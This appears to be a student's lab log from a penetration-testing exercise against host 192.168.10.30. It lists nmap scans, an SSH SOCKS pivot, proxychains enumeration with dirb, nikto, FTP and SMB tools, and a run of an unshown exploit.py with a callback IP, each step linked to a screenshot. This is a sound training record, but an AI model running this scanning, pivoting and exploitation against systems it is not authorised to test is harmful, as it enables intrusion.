# Dunlain 192.168.10.30
## Andrea Zonnekus 18758119

ip a

![](dunlain_steps/Aspose.Words.ee535d1b-b062-4147-9bf5-5fc88f7ec306.001.png)

su firefart

![](dunlain_steps/Aspose.Words.ee535d1b-b062-4147-9bf5-5fc88f7ec306.002.png)

nmap -F 192.168.10.10/24 –open

![](dunlain_steps/Aspose.Words.ee535d1b-b062-4147-9bf5-5fc88f7ec306.003.png)

192.168.10.4

192.168.10.30



nmap -PN -sV -p- 192.168.10.30

![](dunlain_steps/Aspose.Words.ee535d1b-b062-4147-9bf5-5fc88f7ec306.004.png)

nmap -PN -sV -sU -F 192.168.10.30

![](dunlain_steps/Aspose.Words.ee535d1b-b062-4147-9bf5-5fc88f7ec306.005.png)

https://sushant747.gitbooks.io/total-oscp-guide/content/port\_forwarding\_and\_tunneling.html

ssh -D 9050 aetian@192.168.2.150 -o HostKeyAlgorithms=+ssh-dss

![](dunlain_steps/Aspose.Words.ee535d1b-b062-4147-9bf5-5fc88f7ec306.006.png)

proxychains nmap -sV -sC -p 21,80,135,139,445,3389,49154,49156 -O -Pn 192.168.10.30 --open -oN host

![](dunlain_steps/Aspose.Words.ee535d1b-b062-4147-9bf5-5fc88f7ec306.007.png)



proxychains dirb http://192.168.10.30 /usr/share/dirb/wordlists/big.txt -o http

![](dunlain_steps/Aspose.Words.ee535d1b-b062-4147-9bf5-5fc88f7ec306.008.png)

proxychains python exploit.py 192.168.10.30 10.8.0.106

![](dunlain_steps/Aspose.Words.ee535d1b-b062-4147-9bf5-5fc88f7ec306.009.png)

proxychains ftp 192.168.10.30

put test.txt

![](dunlain_steps/Aspose.Words.ee535d1b-b062-4147-9bf5-5fc88f7ec306.010.png)

proxychains smbclient -L 192.168.10.30

![](dunlain_steps/Aspose.Words.ee535d1b-b062-4147-9bf5-5fc88f7ec306.011.png)



proxychains nikto -host http://192.168.10.30 -o nikto -Format text

![](dunlain_steps/Aspose.Words.ee535d1b-b062-4147-9bf5-5fc88f7ec306.012.png)


